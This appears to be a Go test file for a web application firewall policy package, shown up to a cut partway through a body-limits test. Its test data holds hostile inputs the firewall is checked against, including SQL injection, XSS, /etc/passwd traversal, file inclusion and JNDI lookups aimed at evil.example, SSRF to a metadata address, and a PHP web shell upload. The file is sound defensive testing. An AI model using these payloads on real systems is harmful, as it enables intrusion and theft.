// SPDX-License-Identifier: Apache-2.0

package policy

import (
	"fmt"
	"io/fs"
	"net/http"
	"reflect"
	"strconv"
	"strings"
	"testing"
	"time"

	"github.com/corazawaf/coraza/v3"

	"github.com/YurilLAB/coraza/carnical/crs"
	"github.com/YurilLAB/coraza/carnical/proxy"
)

func header(k, v string) func(*http.Request) { return func(r *http.Request) { r.Header.Set(k, v) } }

func multipart(filename, content string) (string, func(*http.Request)) {
	body := "--XBOUNDARYX\r\nContent-Disposition: form-data; name=\"f\"; filename=\"" + filename + "\"\r\nContent-Type: application/octet-stream\r\n\r\n" + content + "\r\n--XBOUNDARYX--\r\n"
	return body, header("Content-Type", "multipart/form-data; boundary=XBOUNDARYX")
}

// groupAttacks is, for each rule group, a request the group's rules stop (and, with every other group off, the only rules that
// see it): found by running each one against the embedded rule set.
var groupAttacks = []struct {
	group  string
	target string
	mod    func(*http.Request)
	body   string
}{
	{"sqli", "/search?q=1%27+OR+%271%27%3D%271%27+--", nil, ""},
	{"xss", "/?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E", nil, ""},
	{"lfi", "/?f=..%2F..%2F..%2F..%2Fetc%2Fpasswd", nil, ""},
	{"rfi", "/?include=http%3A%2F%2Fevil.example%2Fshell.txt%3F", nil, ""},
	{"rce", "/?c=%3B+cat+%2Fetc%2Fpasswd", nil, ""},
	{"php", "/?c=%3C%3Fphp+system(%24_GET%5B%27c%27%5D)%3B+%3F%3E", nil, ""},
	{"ssrf", "/?u=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F", nil, ""},
	{"java", "/", header("X-Api-Version", "${jndi:ldap://evil.example/a}"), ""},
	{"scanner", "/", header("User-Agent", "sqlmap/1.7"), ""},
	{"protocol", "/?a=%00", nil, ""},
}

func groupIDs(ids []int, g GroupInfo) []int {
	var out []int
	for _, id := range ids {
		if id >= g.First && id <= g.Last {
			out = append(out, id)
		}
	}
	return out
}

// onlyGroup is Default with every rule group but one off, so that an attack aimed at one group is judged by that group alone.
func onlyGroup(name string, state GroupState) Policy {
	p := Default()
	for _, g := range Groups() {
		if g.Name != name {
			p.RuleGroups[g.Name] = GroupOff
		}
	}
	if state != GroupOn {
		p.RuleGroups[name] = state
	}
	return p
}

func requestMethod(body string) string {
	if body != "" {
		return "POST"
	}
	return "GET"
}

// A rule group that is on blocks its attack; one set to log lets it through and records what it found, with nothing added to the
// score; one that is off does not look. Each of the ten, in each state, against the real rule set.
func TestRuleGroupStatesOnRealAttacks(t *testing.T) {
	for _, a := range groupAttacks {
		for _, state := range []GroupState{GroupOn, GroupLog, GroupOff} {
			t.Run(a.group+"/"+string(state), func(t *testing.T) {
				t.Parallel()
				e := newEdge(t, onlyGroup(a.group, state))
				code := e.do(requestMethod(a.body), a.target, a.mod, a.body)
				ids := e.ruleIDs()
				seen := groupIDs(ids, groupByName[a.group])
				switch state {
				case GroupOn:
					if code != 403 || len(seen) == 0 || !has(ids, 949110) {
						t.Fatalf("on: status %d, group rules %v, all %v: the attack was not stopped by its group", code, seen, ids)
					}
				case GroupLog:
					if code != 200 || e.reached != 1 {
						t.Fatalf("log: status %d (reached %d): the attack was stopped though the group only logs, all %v", code, e.reached, ids)
					}
					if len(seen) == 0 {
						t.Fatalf("log: nothing was recorded: the group did not run, all %v", ids)
					}
					if has(ids, 949110) {
						t.Fatalf("log: the blocking rule fired")
					}
				case GroupOff:
					if code != 200 || len(seen) != 0 {
						t.Fatalf("off: status %d, group rules %v: the group was not switched off", code, seen)
					}
				}
			})
		}
	}
}

// One group at log does not let another group's attack through, and what the log group scores does not add to anything: with a
// blocking score of 8, a SQL injection (5) and a request whose Host is an address (3) together reach it, and with sqli at log the
// 5 is not counted and they do not.
func TestALogGroupDoesNotWeakenTheOthersAndAddsNothingToTheScore(t *testing.T) {
	asLog := Default()
	asLog.RuleGroups["sqli"] = GroupLog
	e := newEdge(t, asLog)
	if code := e.do("GET", sqlInjection, nil, ""); code != 200 {
		t.Fatalf("a SQL injection with sqli at log: %d", code)
	}
	if !has(e.ruleIDs(), 942100) {
		t.Fatalf("it was not recorded: %v", e.ruleIDs())
	}
	e.reset()
	if code := e.do("GET", "/?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E", nil, ""); code != 403 {
		t.Fatalf("an XSS attack with only sqli at log: %d", code)
	}
	hostIsAddress := func(r *http.Request) { r.Host = "192.0.2.10" }
	for _, tc := range []struct {
		name  string
		state GroupState
		want  int
	}{{"on", GroupOn, 403}, {"log", GroupLog, 200}, {"off", GroupOff, 200}} {
		t.Run("5 and 3 against a threshold of 8, sqli "+tc.name, func(t *testing.T) {
			p := Default()
			p.Threshold = intp(8)
			if tc.state != GroupOn {
				p.RuleGroups["sqli"] = tc.state
			}
			e := newEdge(t, p)
			if code := e.do("GET", sqlInjection, hostIsAddress, ""); code != tc.want {
				t.Fatalf("status %d, want %d (rules %v)", code, tc.want, e.ruleIDs())
			}
		})
	}
}

func intp(n int) *int { return &n }

// A rule that needs several conditions keeps its score in its last link, which an added action cannot reach, so in a group set to
// log it is switched off. The charset check (920480) is one: on, it stops the request; at log, the request passes and the rule says
// nothing; and the compiled policy says so in its notes.
func TestChainedRulesInALogGroupAreSwitchedOffAndSaidSo(t *testing.T) {
	charset := header("Content-Type", "application/x-www-form-urlencoded; charset=utf-7")
	for _, tc := range []struct {
		state GroupState
		want  int
	}{{GroupOn, 403}, {GroupLog, 200}, {GroupOff, 200}} {
		t.Run(string(tc.state), func(t *testing.T) {
			p := onlyGroup("protocol", tc.state)
			e := newEdge(t, p)
			if got := e.do("POST", "/", charset, "a=b"); got != tc.want {
				t.Fatalf("status %d, want %d (%v)", got, tc.want, e.ruleIDs())
			}
			if tc.state != GroupOn && has(e.ruleIDs(), 920480) {
				t.Fatalf("the chained rule 920480 ran in a group that is %s", tc.state)
			}
			c, err := Compile(p)
			if err != nil {
				t.Fatal(err)
			}
			said := false
			for _, n := range c.Notes {
				said = said || strings.Contains(n, "protocol")
			}
			if said != (tc.state == GroupLog) {
				t.Fatalf("notes %v: said = %v for state %s", c.Notes, said, tc.state)
			}
		})
	}
	c, err := Compile(Default())
	if err != nil || len(c.Notes) != 0 {
		t.Fatalf("a policy with no group at log has notes: %v %v", c.Notes, err)
	}
}

// The table of scoring rules is read from the embedded rule set by the code under test; this reads it again, in the simplest way
// that could work (the owner of a scoring setvar is the last rule id seen before it), and checks that the two agree for every
// rule of every group: each is either given a compensation or, if its score is in a later link of a chain, switched off.
func TestEveryScoringRuleOfEveryGroupIsAccountedFor(t *testing.T) {
	files, err := crsFiles(t)
	if err != nil {
		t.Fatal(err)
	}
	own, chained := map[int]bool{}, map[int]bool{}
	cur := 0
	for _, d := range files {
		m := idRe.FindStringSubmatch(d)
		if m != nil {
			cur, _ = strconv.Atoi(m[1])
		}
		if !strings.Contains(d, "setvar:'tx.inbound_anomaly_score_pl") {
			continue
		}
		if m != nil {
			own[cur] = true
		} else {
			chained[cur] = true
		}
	}
	covered, switchedOff := 0, 0
	for _, g := range Groups() {
		lines, off, err := logGroup(g)
		if err != nil {
			t.Fatal(err)
		}
		wantOff, wantComp := map[int]bool{}, map[int]bool{}
		for id := range chained {
			if id >= g.First && id <= g.Last {
				wantOff[id] = true
			}
		}
		for id := range own {
			if id >= g.First && id <= g.Last && !chained[id] {
				wantComp[id] = true
			}
		}
		gotComp, gotOff := map[int]bool{}, map[int]bool{}
		for _, l := range lines {
			var id int
			if _, err := fmt.Sscanf(l, "SecRuleUpdateActionById %d", &id); err != nil {
				t.Fatalf("not an update: %s", l)
			}
			gotComp[id] = true
			if !strings.Contains(l, "=-%{tx.") || strings.Contains(l, "=+") {
				t.Errorf("not a subtraction: %s", l)
			}
		}
		for _, id := range off {
			gotOff[id] = true
		}
		if !reflect.DeepEqual(gotComp, wantComp) || !reflect.DeepEqual(gotOff, wantOff) || len(wantComp) == 0 {
			t.Errorf("group %s: compensated %d, switched off %d; an independent reading of the rule set says %d and %d", g.Name, len(gotComp), len(gotOff), len(wantComp), len(wantOff))
		}
		covered += len(gotComp)
		switchedOff += len(gotOff)
	}
	if covered < 200 || switchedOff < 30 || switchedOff > 60 {
		t.Errorf("%d rules compensated and %d switched off: not what the rule set 4.30 holds (about 240 and 45)", covered, switchedOff)
	}
	t.Logf("with a group at log: %d scoring rules have their score taken back, and %d chained rules are switched off", covered, switchedOff)
}

func crsFiles(t testing.TB) ([]string, error) {
	t.Helper()
	files, err := fs.Glob(crs.FS(), "owasp_crs/REQUEST-9??-*.conf")
	if err != nil || len(files) == 0 {
		return nil, fmt.Errorf("no request rules found: %v", err)
	}
	var out []string
	for _, f := range files {
		data, err := fs.ReadFile(crs.FS(), f)
		if err != nil {
			return nil, err
		}
		out = append(out, directives(string(data))...)
	}
	return out, nil
}

func TestSensitivityPresets(t *testing.T) {
	th := func(n int) *int { return &n }
	rows := []struct {
		name string
		sens Sensitivity
		thr  *int
		want Preset
		eff  [2]int // paranoia, inbound
	}{
		{"relaxed", SensitivityRelaxed, nil, Preset{1, 8, 8}, [2]int{1, 8}},
		{"normal", SensitivityNormal, nil, Preset{1, 5, 4}, [2]int{1, 5}},
		{"strict", SensitivityStrict, nil, Preset{2, 5, 4}, [2]int{2, 5}},
		{"relaxed with threshold 1", SensitivityRelaxed, th(1), Preset{1, 8, 8}, [2]int{1, 1}},
		{"relaxed with threshold 5", SensitivityRelaxed, th(5), Preset{1, 8, 8}, [2]int{1, 5}},
		{"relaxed with threshold 12", SensitivityRelaxed, th(12), Preset{1, 8, 8}, [2]int{1, 12}},
		{"relaxed with threshold 1000", SensitivityRelaxed, th(1000), Preset{1, 8, 8}, [2]int{1, 1000}},
		{"normal with threshold 1", SensitivityNormal, th(1), Preset{1, 5, 4}, [2]int{1, 1}},
		{"normal with threshold 3", SensitivityNormal, th(3), Preset{1, 5, 4}, [2]int{1, 3}},
		{"normal with threshold 5", SensitivityNormal, th(5), Preset{1, 5, 4}, [2]int{1, 5}},
		{"normal with threshold 12", SensitivityNormal, th(12), Preset{1, 5, 4}, [2]int{1, 12}},
		{"normal with threshold 1000", SensitivityNormal, th(1000), Preset{1, 5, 4}, [2]int{1, 1000}},
		{"strict with threshold 1", SensitivityStrict, th(1), Preset{2, 5, 4}, [2]int{2, 1}},
		{"strict with threshold 5", SensitivityStrict, th(5), Preset{2, 5, 4}, [2]int{2, 5}},
		{"strict with threshold 12", SensitivityStrict, th(12), Preset{2, 5, 4}, [2]int{2, 12}},
		{"strict with threshold 1000", SensitivityStrict, th(1000), Preset{2, 5, 4}, [2]int{2, 1000}},
	}
	for _, r := range rows {
		t.Run(r.name, func(t *testing.T) {
			got, ok := PresetFor(r.sens)
			if !ok || got != r.want {
				t.Fatalf("PresetFor = %+v, %v; want %+v", got, ok, r.want)
			}
			p := mut(func(p *Policy) { p.Sensitivity, p.Threshold = r.sens, r.thr })
			c, err := Compile(p)
			if err != nil {
				t.Fatal(err)
			}
			if c.CRS.ParanoiaLevel != r.eff[0] || c.CRS.InboundThreshold != r.eff[1] || c.CRS.OutboundThreshold != r.want.OutboundThreshold {
				t.Fatalf("CRS settings %+v, want paranoia %d, inbound %d, outbound %d", c.CRS, r.eff[0], r.eff[1], r.want.OutboundThreshold)
			}
			if c.CRS.DetectionParanoiaLevel != 0 {
				t.Fatalf("the detection paranoia level is %d: it must follow the blocking one", c.CRS.DetectionParanoiaLevel)
			}
			if err := c.CRS.Validate(); err != nil {
				t.Fatal(err)
			}
			pa, ia := p.effective()
			if pa != r.eff[0] || ia != r.eff[1] {
				t.Fatalf("effective() = %d, %d", pa, ia)
			}
		})
	}
	t.Run("a name that is not a sensitivity", func(t *testing.T) {
		if _, ok := PresetFor("standard"); ok {
			t.Fatal("standard is the PHP console's word, not this policy's")
		}
	})
	t.Run("the table stays within what the rule set can do", func(t *testing.T) {
		for s, p := range presets {
			if p.ParanoiaLevel < 1 || p.ParanoiaLevel > 2 || p.InboundThreshold < 1 || p.OutboundThreshold < 1 {
				t.Errorf("%s: %+v", s, p)
			}
		}
		if presets[SensitivityRelaxed].InboundThreshold <= presets[SensitivityNormal].InboundThreshold || presets[SensitivityStrict].ParanoiaLevel <= presets[SensitivityNormal].ParanoiaLevel {
			t.Error("the presets are not ordered relaxed, normal, strict")
		}
	})
}

// The presets against real requests: one rule's score of 5 stops a request at normal and strict but not at relaxed (8); a rule of
// paranoia level 2 stops a request only at strict; a threshold of 3 stops a request that scores a single warning.
func TestSensitivityDecidesRealRequests(t *testing.T) {
	edges := map[string]*edge{}
	build := func(name string, change func(*Policy)) {
		edges[name] = newEdge(t, mut(change))
	}
	build("relaxed", func(p *Policy) { p.Sensitivity = SensitivityRelaxed })
	build("normal", func(p *Policy) {})
	build("strict", func(p *Policy) { p.Sensitivity = SensitivityStrict })
	build("normal-3", func(p *Policy) { p.Threshold = intp(3) })
	probes := []struct {
		name    string
		target  string
		mod     func(*http.Request)
		relaxed int
		normal  int
		strict  int
		normal3 int
	}{
		{"a single critical rule (order by)", "/x?id=1+order+by+10", nil, 200, 403, 403, 403},
		{"a rule of paranoia level 2 (base64 text)", "/x?c=ZWNobyAnaGknOw%3D%3D", nil, 200, 200, 403, 200},
		{"a single warning (the host is an address)", "/", func(r *http.Request) { r.Host = "192.0.2.10" }, 200, 200, 200, 403},
		{"several rules together (sleep)", "/x?id=1+and+sleep(5)", nil, 403, 403, 403, 403},
		{"an ordinary request", "/", nil, 200, 200, 200, 200},
		{"an ordinary search", "/search?q=blue+widgets", nil, 200, 200, 200, 200},
	}
	for _, pr := range probes {
		t.Run(pr.name, func(t *testing.T) {
			for name, want := range map[string]int{"relaxed": pr.relaxed, "normal": pr.normal, "strict": pr.strict, "normal-3": pr.normal3} {
				if got := edges[name].do("GET", pr.target, pr.mod, ""); got != want {
					t.Errorf("%s: status %d, want %d", name, got, want)
				}
			}
		})
	}
}

func TestModes(t *testing.T) {
	for _, m := range []struct {
		mode    Mode
		want    int
		matches bool
	}{{ModeBlock, 403, true}, {ModeMonitor, 200, true}, {ModeOff, 200, false}} {
		t.Run(string(m.mode), func(t *testing.T) {
			t.Parallel()
			e := newEdge(t, mut(func(p *Policy) { p.Mode = m.mode }))
			if got := e.do("GET", sqlInjection, nil, ""); got != m.want {
				t.Fatalf("status %d, want %d", got, m.want)
			}
			if got := len(e.ruleIDs()) > 0; got != m.matches {
				t.Fatalf("rules reported: %v (%v), want reported = %v", got, e.ruleIDs(), m.matches)
			}
			e.reset()
			if got := e.do("GET", "/", nil, ""); got != 200 {
				t.Fatalf("an ordinary request: %d", got)
			}
		})
	}
}

func TestExclusionsKeepRulesAwayOnlyWhereTheyAreAimed(t *testing.T) {
	xss := `<script>alert(1)</script>`
	sqli := `1' OR '1'='1' --`
	form := func(k, v string) string {
		return k + "=" + strings.NewReplacer(" ", "+", "'", "%27", "<", "%3C", ">", "%3E", "=", "%3D", "(", "%28", ")", "%29", "/", "%2F", "-", "%2D").Replace(v)
	}
	p := mut(func(p *Policy) {
		p.Exclusions = []Exclusion{
			{Path: "/editor/", Categories: []string{"xss"}, Targets: []string{"arg:content"}},
			{Path: "/api/", Categories: []string{"xss", "rce"}},
			{Path: "/wide/", Categories: []string{"sqli"}, Targets: []string{"args"}},
			{Path: "/cookie/", Categories: []string{"xss"}, Targets: []string{"cookie:note"}},
			{Path: "/hdr/", Categories: []string{"xss"}, Targets: []string{"header:x-note"}},
		}
	})
	e := newEdge(t, p)
	rows := []struct {
		name   string
		method string
		target string
		mod    func(*http.Request)
		body   string
		want   int
	}{
		{"xss in the excluded argument on the excluded page", "POST", "/editor/save", nil, form("content", xss), 200},
		{"xss in another argument on the excluded page", "POST", "/editor/save", nil, form("other", xss), 403},
		{"xss in the excluded argument on another page", "POST", "/other/save", nil, form("content", xss), 403},
		{"xss in the excluded argument on a page that only starts alike", "POST", "/editors/save", nil, form("content", xss), 403},
		{"xss in the excluded argument, the path in another case", "POST", "/Editor/save", nil, form("content", xss), 403},
		{"sql injection in the excluded argument (another group)", "POST", "/editor/save", nil, form("content", sqli), 403},
		{"the whole xss group on the page", "POST", "/api/items", nil, form("anything", xss), 200},
		{"sql injection on the page that excludes xss", "POST", "/api/items", nil, form("anything", sqli), 403},
		{"xss in the query of the page that excludes the group", "GET", "/api/items?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E", nil, "", 200},
		{"sql injection in an argument where sqli is excluded for args", "POST", "/wide/x", nil, form("a", sqli), 200},
		{"sql injection in a cookie where sqli is excluded only for args", "GET", "/wide/x", header("Cookie", "a=1' OR '1'='1' --"), "", 403},
		{"xss in the excluded cookie", "GET", "/cookie/x", header("Cookie", "note=<script>alert(1)</script>"), "", 200},
		{"xss in another cookie", "GET", "/cookie/x", header("Cookie", "other=<script>alert(1)</script>"), "", 403},
		{"xss in the excluded header", "GET", "/hdr/x", header("X-Note", "<script>alert(1)</script>"), "", 200},
		{"xss in another header", "GET", "/hdr/x", header("X-Other", "<script>alert(1)</script>"), "", 403},
		{"an ordinary request", "GET", "/editor/save", nil, "", 200},
		{"xss in a page with no exclusion", "GET", "/?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E", nil, "", 403},
	}
	for _, r := range rows {
		t.Run(r.name, func(t *testing.T) {
			if got := e.do(r.method, r.target, r.mod, r.body); got != r.want {
				t.Fatalf("status %d, want %d (rules %v)", got, r.want, e.ruleIDs())
			}
		})
	}
}

func TestAddressListsAndAllowedPaths(t *testing.T) {
	p := mut(func(p *Policy) {
		p.AllowIPs = []string{"203.0.113.9"}
		p.BlockIPs = []string{"198.51.100.0/24", "203.0.113.9/32"}
		p.AllowPaths = []string{"/webhook/", "/health"}
	})
	e := newEdge(t, p)
	from := func(addr string) func(*http.Request) { return func(r *http.Request) { r.RemoteAddr = addr + ":5000" } }
	rows := []struct {
		name   string
		target string
		mod    func(*http.Request)
		want   int
	}{
		{"an attack from an ordinary address", sqlInjection, nil, 403},
		{"an ordinary request from an ordinary address", "/", nil, 200},
		{"an attack from the allow-listed address (also on the block list: the allow list wins)", sqlInjection, from("203.0.113.9"), 200},
		{"an ordinary request from the allow-listed address", "/", from("203.0.113.9"), 200},
		{"an ordinary request from a blocked range", "/", from("198.51.100.50"), 403},
		{"an attack from a blocked range", sqlInjection, from("198.51.100.50"), 403},
		{"the address next to the blocked range", "/", from("198.51.101.1"), 200},
		{"an attack on a page that is never inspected", "/webhook/stripe?q=1%27+OR+%271%27%3D%271%27+--", nil, 200},
		{"an attack on the file that is never inspected", "/health?q=1%27+OR+%271%27%3D%271%27+--", nil, 200},
		{"an attack on a page that starts alike", "/webhooks/x?q=1%27+OR+%271%27%3D%271%27+--", nil, 403},
		{"an attack on the page in another case", "/Webhook/x?q=1%27+OR+%271%27%3D%271%27+--", nil, 403},
		{"an attack in the query that mentions the page", "/x?p=/webhook/&q=1%27+OR+%271%27%3D%271%27+--", nil, 403},
		{"a blocked address on the page that is never inspected (the block list still applies)", "/webhook/stripe", from("198.51.100.7"), 403},
	}
	for _, r := range rows {
		t.Run(r.name, func(t *testing.T) {
			if got := e.do("GET", r.target, r.mod, ""); got != r.want {
				t.Fatalf("status %d, want %d (rules %v)", got, r.want, e.ruleIDs())
			}
		})
	}
	t.Run("in monitor mode the block list records and does not refuse", func(t *testing.T) {
		pm := p
		pm.Mode = ModeMonitor
		em := newEdge(t, pm)
		if got := em.do("GET", "/", from("198.51.100.50"), ""); got != 200 {
			t.Fatalf("status %d", got)
		}
		if !has(em.ruleIDs(), idBlockIPs) {
			t.Fatalf("the match was not recorded: %v", em.ruleIDs())
		}
	})
}

func TestCustomRulesOfEveryFieldAndOperator(t *testing.T) {
	type row struct {
		name   string
		rule   CustomRule
		method string
		target string
		mod    func(*http.Request)
		body   string
		clean  string // a request for the same place that must not match
	}
	body, mp := multipart("db.bak", "data")
	cleanBody, _ := multipart("db.txt", "data")
	_ = cleanBody
	rows := []row{
		{name: "method equals", rule: CustomRule{Field: "method", Operator: OpEquals, Value: "PATCH"}, method: "PATCH", target: "/x"},
		{name: "path beginsWith", rule: CustomRule{Field: "path", Operator: OpBeginsWith, Value: "/old-admin/"}, target: "/old-admin/x", clean: "/new-admin/x"},
		{name: "uri contains, after decoding", rule: CustomRule{Field: "uri", Operator: OpContains, Value: "debug=1"}, target: "/status?d%65bug=1", clean: "/status?d%65bug=2"},
		{name: "query contains", rule: CustomRule{Field: "query", Operator: OpContains, Value: "evil"}, target: "/?x=evil", clean: "/?x=good"},
		{name: "args contains, any case", rule: CustomRule{Field: "args", Operator: OpContains, Value: "casino"}, target: "/?q=Casino+Royale", clean: "/?q=cafe"},
		{name: "argnames equals", rule: CustomRule{Field: "argnames", Operator: OpEquals, Value: "secretparam"}, target: "/?secretparam=1", clean: "/?secretparams=1"},
		{name: "one argument rx", rule: CustomRule{Field: "arg:token", Operator: OpRX, Value: `^[0-9]{3}$`}, target: "/?token=123", clean: "/?token=1234"},
		{name: "cookies contains", rule: CustomRule{Field: "cookies", Operator: OpContains, Value: "evilcookie"}, target: "/", mod: header("Cookie", "a=evilcookie")},
		{name: "cookienames equals", rule: CustomRule{Field: "cookienames", Operator: OpEquals, Value: "tracker"}, target: "/", mod: header("Cookie", "tracker=1")},
		{name: "one cookie beginsWith", rule: CustomRule{Field: "cookie:session", Operator: OpBeginsWith, Value: "bad"}, target: "/", mod: header("Cookie", "session=badvalue")},
		{name: "headers contains", rule: CustomRule{Field: "headers", Operator: OpContains, Value: "x-evil-value"}, target: "/", mod: header("X-Foo", "X-Evil-Value")},
		{name: "one header equals", rule: CustomRule{Field: "header:x-api-key", Operator: OpEquals, Value: "letmein"}, target: "/", mod: header("X-Api-Key", "letmein")},
		{name: "user agent contains", rule: CustomRule{Field: "useragent", Operator: OpContains, Value: "badbot"}, target: "/", mod: header("User-Agent", "BadBot/1.0")},
		{name: "host endsWith", rule: CustomRule{Field: "host", Operator: OpEndsWith, Value: ".evil.test"}, target: "/", mod: func(r *http.Request) { r.Host = "a.evil.test" }},
		{name: "body contains", rule: CustomRule{Field: "body", Operator: OpContains, Value: "a=evilpayload"}, method: "POST", target: "/post", body: "a=evilpayload"},
		{name: "filenames endsWith", rule: CustomRule{Field: "filenames", Operator: OpEndsWith, Value: ".bak"}, method: "POST", target: "/upload", mod: mp, body: body},
		{name: "args pm", rule: CustomRule{Field: "args", Operator: OpPM, Values: []string{"viagra", "cialis", "poker"}}, target: "/?q=cheap+CIALIS+here", clean: "/?q=cheap+tea+here"},
		{name: "path rx, case sensitive", rule: CustomRule{Field: "path", Operator: OpRX, Value: `^/Old-(admin|panel)/`, CaseSensitive: true}, target: "/Old-panel/x", clean: "/old-panel/x"},
		{name: "a value with quotes, a backslash and a macro", rule: CustomRule{Field: "args", Operator: OpContains, Value: `a"b\c%{tx.x}`}, target: "/?q=" + strings.NewReplacer(`"`, "%22", `\`, "%5C", "%", "%25", "{", "%7B", "}", "%7D").Replace(`xa"b\c%{tx.x}y`), clean: "/?q=abc"},
	}
	p := Default()
	for i := range rows {
		rows[i].rule.ID = i + 1
		rows[i].rule.Action = ActionBlock
		p.CustomRules = append(p.CustomRules, rows[i].rule)
	}
	p.AllowedMethods = append(p.AllowedMethods, "PATCH")
	e := newEdge(t, p)
	for _, r := range rows {
		t.Run(r.name, func(t *testing.T) {
			e.reset()
			method := r.method
			if method == "" {
				method = "GET"
			}
			if got := e.do(method, r.target, r.mod, r.body); got != 403 {
				t.Fatalf("status %d, want 403 (rules %v)", got, e.ruleIDs())
			}
			if !has(e.ruleIDs(), idCustom+r.rule.ID) {
				t.Fatalf("the rule did not report: %v", e.ruleIDs())
			}
			for _, m := range e.matches {
				if m.RuleID == idCustom+r.rule.ID && (m.Message != "Coraza rule matched" || m.Severity == "") {
					t.Fatalf("the report is %+v: its message must be fixed text", m)
				}
			}
			if r.clean != "" {
				e.reset()
				if got := e.do("GET", r.clean, r.mod, ""); got != 200 || has(e.ruleIDs(), idCustom+r.rule.ID) {
					t.Fatalf("the near miss %s: status %d, rules %v", r.clean, got, e.ruleIDs())
				}
			}
		})
	}
	t.Run("an ordinary request matches none of them", func(t *testing.T) {
		e.reset()
		if got := e.do("GET", "/", nil, ""); got != 200 {
			t.Fatalf("status %d (%v)", got, e.ruleIDs())
		}
	})
}

func TestCustomRuleActionAndModeBehave(t *testing.T) {
	mk := func(mode Mode, action Action) *edge {
		return newEdge(t, mut(func(p *Policy) {
			p.Mode = mode
			p.CustomRules = []CustomRule{{ID: 5, Field: "path", Operator: OpBeginsWith, Value: "/secret/", Action: action}}
		}))
	}
	for _, tc := range []struct {
		mode   Mode
		action Action
		want   int
		logged bool
	}{{ModeBlock, ActionBlock, 403, true}, {ModeBlock, ActionLog, 200, true}, {ModeMonitor, ActionBlock, 200, true}, {ModeMonitor, ActionLog, 200, true}, {ModeOff, ActionBlock, 200, false}} {
		t.Run(fmt.Sprintf("%s mode, %s", tc.mode, tc.action), func(t *testing.T) {
			e := mk(tc.mode, tc.action)
			if got := e.do("GET", "/secret/x", nil, ""); got != tc.want {
				t.Fatalf("status %d, want %d", got, tc.want)
			}
			if got := has(e.ruleIDs(), idCustom+5); got != tc.logged {
				t.Fatalf("recorded = %v, want %v", got, tc.logged)
			}
		})
	}
}

func TestProxyOptionsFollowThePolicy(t *testing.T) {
	t.Run("host names", func(t *testing.T) {
		e := newEdge(t, mut(func(p *Policy) { p.AllowedHosts = []string{"shop.example.test"} }))
		if got := e.do("GET", "/", nil, ""); got != 200 {
			t.Fatalf("the allowed host: %d", got)
		}
		if got := e.do("GET", "/", func(r *http.Request) { r.Host = "evil.example.test" }, ""); got != 421 {
			t.Fatalf("another host: %d, want 421", got)
		}
	})
	t.Run("methods", func(t *testing.T) {
		plain := newEdge(t, Default())
		rest := newEdge(t, mut(func(p *Policy) {
			p.AllowedMethods = []string{"GET", "HEAD", "POST", "PUT", "PATCH", "DELETE", "OPTIONS"}
		}))
		if got := plain.do("PUT", "/item/1", header("Content-Type", "application/json"), `{"a":1}`); got != 403 {
			t.Errorf("PUT with the default list: %d, want 403", got)
		}
		if got := rest.do("PUT", "/item/1", header("Content-Type", "application/json"), `{"a":1}`); got != 200 {
			t.Errorf("PUT with PUT allowed: %d, want 200", got)
		}
	})
	t.Run("deny headers and Next-Action", func(t *testing.T) {
		e := newEdge(t, mut(func(p *Policy) {
			p.DenyHeaders = []string{"x_internal"}
			p.Framework.DenyNextAction = true
		}))
		for _, h := range []string{"X-Internal", "X_Internal", "Next-Action"} {
			if got := e.do("GET", "/", header(h, "1"), ""); got != 400 {
				t.Errorf("the header %s: %d, want 400", h, got)
			}
		}
		if got := e.do("GET", "/", header("X-Fine", "1"), ""); got != 200 {
			t.Errorf("another header: %d", got)
		}
		open := newEdge(t, Default())
		if got := open.do("GET", "/", header("Next-Action", "1"), ""); got != 200 {
			t.Errorf("Next-Action with the option off: %d", got)
		}
	})
	t.Run("WordPress", func(t *testing.T) {
		off := newEdge(t, Default())
		on := newEdge(t, mut(func(p *Policy) { p.WordPress.Enabled = true }))
		xmlrpc := newEdge(t, mut(func(p *Policy) { p.WordPress.Enabled, p.WordPress.AllowXMLRPC = true, true }))
		if got := off.do("GET", "/xmlrpc.php", nil, ""); got != 200 {
			t.Errorf("xmlrpc.php with WordPress off: %d", got)
		}
		if got := on.do("GET", "/xmlrpc.php", nil, ""); got != 403 {
			t.Errorf("xmlrpc.php with WordPress on: %d, want 403", got)
		}
		if got := xmlrpc.do("GET", "/xmlrpc.php", nil, ""); got != 200 {
			t.Errorf("xmlrpc.php with it allowed: %d", got)
		}
		limited := newEdge(t, mut(func(p *Policy) { p.WordPress.Enabled, p.WordPress.LoginPerMinute = true, 2 }))
		var codes []int
		for i := 0; i < 4; i++ {
			codes = append(codes, limited.do("POST", "/wp-login.php", nil, "log=a&pwd=b"))
		}
		if !reflect.DeepEqual(codes, []int{200, 200, 429, 429}) {
			t.Errorf("login attempts with a limit of 2 a minute: %v", codes)
		}
	})
	t.Run("uploads", func(t *testing.T) {
		strict := newEdge(t, Default())
		lax := newEdge(t, mut(func(p *Policy) { p.Uploads = UploadOptions{AllowScriptNames: true, AllowScriptContent: true} }))
		shell, mpShell := multipart("shell.php", "<?php system($_GET['c']); ?>")
		plain, mpPlain := multipart("photo.jpg", "JFIFdata")
		if got := strict.do("POST", "/upload", mpShell, shell); got != 403 {
			t.Errorf("a shell upload with the default: %d, want 403", got)
		}
		if got := strict.do("POST", "/upload", mpPlain, plain); got != 200 {
			t.Errorf("a photo with the default: %d", got)
		}
		named, mpNamed := multipart("run.php", "harmless text")
		if got := strict.do("POST", "/upload", mpNamed, named); got != 403 {
			t.Errorf("a script name with the default: %d, want 403", got)
		}
		if got := lax.do("POST", "/upload", mpNamed, named); got == 403 && has(lax.ruleIDs(), 5000010) {
			t.Errorf("a script name with the option on was still refused by the proxy's upload check")
		}
	})
	t.Run("paths", func(t *testing.T) {
		strict := newEdge(t, Default())
		lax := newEdge(t, mut(func(p *Policy) { p.Paths = PathOptions{AllowEncodedSlash: true, AllowPathParams: true} }))
		if got := strict.do("GET", "/a%2fb", nil, ""); got != 400 {
			t.Errorf("an encoded slash with the default: %d, want 400", got)
		}
		if got := lax.do("GET", "/a%2fb", nil, ""); got != 200 {
			t.Errorf("an encoded slash allowed: %d", got)
		}
		if got := strict.do("GET", "/a;jsessionid=1", nil, ""); got != 400 {
			t.Errorf("a path parameter with the default: %d, want 400", got)
		}
		if got := lax.do("GET", "/a;jsessionid=1", nil, ""); got != 200 {
			t.Errorf("a path parameter allowed: %d", got)
		}
	})
	t.Run("body limits", func(t *testing.T) {
		e := newEdge(t, mut(func(p *Policy) { p.Body = BodyLimits{MaxUploadBytes: 8192, MaxFormBytes: 2048} }))
